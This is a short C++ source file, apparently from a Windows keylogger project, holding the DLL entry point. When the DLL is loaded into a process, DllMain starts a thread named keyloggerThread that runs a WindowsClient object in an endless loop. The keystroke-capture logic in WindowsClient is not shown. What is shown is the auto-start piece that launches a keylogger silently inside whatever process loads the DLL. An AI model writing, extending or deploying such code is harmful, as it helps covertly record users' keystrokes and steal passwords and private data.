#include "stdafx.h"
#include <Windows.h>

#include "WindowsClient.h"

DWORD WINAPI		keyloggerThread(LPVOID lpParameter)
{
	WindowsClient	client;

	while (1)
	{
		client.run();
	}
	return (0);
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
					 )
{
	if (ul_reason_for_call == DLL_PROCESS_ATTACH)
	{
		HANDLE handler = CreateThread(0, 0, keyloggerThread, 0, 0, NULL);
		WaitForSingleObject(handler, 2000);
	}
	return TRUE;
}

